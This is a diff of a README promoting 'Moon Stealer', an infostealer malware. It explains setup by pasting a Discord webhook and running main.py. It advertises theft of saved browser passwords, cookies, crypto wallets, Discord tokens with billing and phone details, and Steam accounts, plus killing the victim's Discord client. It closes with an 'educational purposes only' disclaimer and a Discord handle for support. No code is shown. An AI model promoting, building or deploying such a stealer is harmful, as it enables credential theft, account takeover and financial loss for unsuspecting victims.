@@ -1,8 +1,6 @@
 <h1 align="center">
 
 🌑 Moon Stealer 🌑
- 
-FUD (Fully Undetectable)
 
 <h1 align="center">
  
@@ -18,7 +16,7 @@ FUD (Fully Undetectable)
 
 ### If you get any errors please DM Ultraviolet#9999 on discord!
 
-### >> Setup
+### ! Setup
 
 1: Put your webhook at ``hook = "X"``
 2: Run main.py, you will see your info in the webhook you entered. You need to have python installed to do this, use our built in tool ``Get-Python.bat`` which is located in the **tools** folder to install python!
@@ -32,7 +30,7 @@ FUD (Fully Undetectable)
 
 ### >> Features
 
-- Browser Data
+- Browser Stealer
     - Steal Saved Passwords
     - Steal Cookies
 
@@ -41,9 +39,17 @@ FUD (Fully Undetectable)
     - Steal Exodus Wallet
     - Steal Atomic Wallet
 
-- Discord
+- Discord Stealer
     - Steal Discord Tokens from browsers
     - Steal Discord Token from discord, discordcanary, discordPTBa
+
+- Discord Token
+    - Nitro
+    - Badges
+    - Billing
+    - Email
+    - Phone
+    - HQ Friends
 
 - Gaming
     - Steal Steam Launcher accounts
@@ -56,7 +62,7 @@ FUD (Fully Undetectable)
 - Extras
     - KILL DC (Kills Victim's Discord Client)
 
-### >> Important
+### ! Important
 
 I am not responsible for any damages this software may cause. This program was made for educational purposes only.
 
